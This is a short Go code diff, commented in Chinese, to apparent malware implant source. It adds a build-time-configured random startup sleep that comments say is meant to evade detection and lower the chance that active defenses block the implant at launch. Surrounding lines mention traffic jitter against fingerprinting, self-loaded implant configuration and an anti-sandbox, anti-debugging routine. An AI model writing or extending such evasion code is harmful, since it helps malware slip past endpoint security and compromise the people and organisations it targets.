@@ -47,6 +47,11 @@ var (
 	// 打破固定节奏的流量指纹，降低周期性检测识别。
 	jitterPct int
 
+	// 启动随机延迟（秒，构建期注入占位符）：启动后随机休眠 [min,max] 秒，
+	// 打乱"启动即连/即行为"的检测节奏，降低主动防御在启动阶段的拦截概率。
+	startupDelayMin = {{STARTUP_DELAY_MIN}}
+	startupDelayMax = {{STARTUP_DELAY_MAX}}
+
 	// 重连指数退避：连续失败时等待时间按 2^n 增长（受 RETRY_WAIT 与上限约束）。
 	retryWaitSec  int
 	maxBackoffSec int
@@ -277,6 +282,13 @@ func loadConfigFromSelf() *implantConfig {
 }
 
 func main() {
+	// 启动默认随机延迟：先休眠 [startupDelayMin, startupDelayMax] 秒（构建期配置，默认 5~30s），
+	// 打乱"启动即连/即行为"的检测节奏，降低主动防御在启动阶段的拦截概率。
+	if startupDelayMax >= startupDelayMin && startupDelayMin > 0 {
+		d := startupDelayMin + int(time.Now().UnixNano()%int64(startupDelayMax-startupDelayMin+1))
+		time.Sleep(time.Duration(d) * time.Second)
+	}
+
 	// 反沙箱/反调试：命中可疑环境时延迟执行（Windows 下有效，其它平台为空操作）
 	evasionInit()
 
